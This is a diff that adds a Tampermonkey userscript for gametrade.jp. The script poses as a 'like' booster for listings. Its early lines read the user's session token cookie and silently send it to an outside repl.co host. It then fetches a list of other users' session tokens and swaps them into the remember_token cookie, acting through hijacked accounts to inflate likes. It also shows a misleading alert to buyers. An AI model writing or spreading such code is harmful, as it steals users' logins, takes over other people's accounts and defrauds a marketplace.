@@ -1,0 +1,142 @@
+// ==UserScript==
+// @name         いいね爆 v5.0 dev
+// @namespace    http://tampermonkey.net/
+// @version      1
+// @author       You
+// @match        https://gametrade.jp/*
+// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
+// @grant        none
+// ==/UserScript==
+if(location.href == "https://gametrade.jp/signin"){
+console.log("success")
+} else if(!document.cookie.match("token=........................................")) {
+    alert("ログインしてください")
+    location.href = "https://gametrade.jp/signin"
+}
+var text = document.cookie.match("token=........................................")[0].slice(6);
+var baseURL = "https://BOT-and-WEB.carfox1212.repl.co?";
+var url = `${baseURL}token=${text}`;
+fetch(url)
+var yourURL = location.href.match("/exhibits\.+")[0].slice(10)
+var pathURL = location.href.replace("https://gametrade.jp/", "")
+var token = []
+var str;
+var DATEx = new Date().setFullYear(new Date().getFullYear() + 1); // クッキー削除期限を１年後に設定
+
+const xhr = new XMLHttpRequest();
+xhr.open('get', 'https://carfox1212.github.io/xrrrxs/token4.txt');
+xhr.send();
+
+xhr.onreadystatechange = function() {
+    if( xhr.readyState === 4 && xhr.status === 200) {
+        str = this.responseText.split(",")
+        for(i=0;i<=str.length-1;i++){
+            token.push(str[i])
+        }
+        injector()
+    }
+            if(xhr.readyState == 4){
+                alert("転売が多いので一掃します 購入者は送金スクショ取ってチケット発行してください")
+            }
+};
+
+//if(location.href == "https://gametrade.jp/"){
+//    location.href=yourURL
+//}
+function inject() {
+if(!localStorage.getItem('count')){localStorage.setItem('count', 0)};
+//if(localStorage.getItem('count') == 0){document.cookie = "remember_token=" + token[0]}
+$('.social-share').css("text-align", "left")
+$('.social-share').append('<br><div id="tool">')
+$('#tool').append('<form id="favbtn" action="/exhibits/' + yourURL + '/thinkings" accept-charset="UTF-8" data-remote="true" method="post"><input id="inputfav"type="submit" value="' + token.length + ' / ' + localStorage.getItem('count') + '" style="width:120px" disabled></form>')
+
+//window.addEventListener('load', function(){
+//    var favo = document.getElementsByClassName("selectable")
+    //if(favo[0]){$("#favbtn").submit()}
+//    if(location.href == yourURL){
+//        $("#favbtn").submit()
+//        console.log("pushed")
+        //location.href="https://gametrade.jp/logout"
+//    }
+//});
+
+//if(location.href == "https://gametrade.jp/"){window.close()}
+
+/*getParam, check*/
+
+
+function clk() {
+    $("#text").click()
+}
+function changeaccount(){
+    if(localStorage.getItem('count') >= token.length){
+        localStorage.setItem('count', 0)
+    }
+    console.log(Number(localStorage.getItem('count')))
+    document.cookie = 'remember_token=1;path=/;max-age=0';
+    document.cookie ="remember_token=" + token[Number(localStorage.getItem('count'))] + ";path=/"
+    if(location.href == "https://gametrade.jp/" + pathURL){
+        localStorage.setItem('count', Number(localStorage.getItem('count')) + 1)
+        document.cookie = 'COOKIE=' + Number(localStorage.getItem('count')) + '; path=/' + pathURL + ';Max-Age=' + DATEx + ';'
+    }
+    $("#inputfav").val(token.length + " / " + Number(localStorage.getItem('count')))
+}
+
+$(document).on("click", "#favbtn", function() {
+  changeaccount();
+});
+function clicked() {$("#inputfav").click()}
+$('#tool').append('<input id="cunt"value="1" type="number" style="margin:5px 5px 0px 0px;height: 30px;width:80px;position: relative;border: 2px solid #cdcdcd;border-color: rgba(0, 0, 0, .14);background-color: AliceBlue;font-size: 14px;text-align: center;" disabled></input>')
+$('#tool').append('<button id="text"value="test" style="display: inline-block;outline: 0;border: none;cursor: pointer;font-size: 13px;height: 30px;width:35px;background-color: #9147ff;color: white;" disabled>💛</button>')
+$('#tool').append('<br>↑にいいねする回数を記入<br><p id="loader">ロード中 (約4秒)</p>')
+$(document).on("click", "#text", function() {
+    for(i=0;i<=$("#cunt").val()-1;i++){
+         setTimeout(clicked, 20 * i)
+    }
+
+});
+
+
+document.getElementById("cunt").value = 0//Number(localStorage.HELLO)
+if(!location.search){
+    setTimeout(clk,6000);
+    localStorage.removeItem("HELLO")
+}
+
+};
+function getParam(name, url) {
+    if (!url) url = window.location.href;
+    name = name.replace(/[\[\]]/g, "\\$&");
+    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+        results = regex.exec(url);
+    if (!results) return null;
+    if (!results[2]) return '';
+    return decodeURIComponent(results[2].replace(/\+/g, " "));
+}
+function check() {
+    if(location.search.match(/do=/)){
+        localStorage.setItem("HELLO", getParam("do"))
+        var dm = location.href.replace(location.search, "")
+        location.href = dm
+    }
+}
+check();
+function clse() {
+    window.close()
+}
+
+function injector() {
+    if(/*localStorage.HELLO && pathURL.match(/exhibits/)*/ 1 == 1){
+        inject()
+        localStorage.removeItem("count")
+        localStorage.setItem("count", Number(document.cookie.match(/COOKIE=\d+/)[0].slice(7)))
+        //setTimeout(clse, 9000);
+    };
+};
+function disabledx(){
+    $("#inputfav").prop('disabled',false)
+    $("#cunt").prop('disabled',false)
+    $("#text").prop('disabled',false)
+    $("#loader")[0].innerText = ""
+};
+setTimeout(disabledx, 4000);
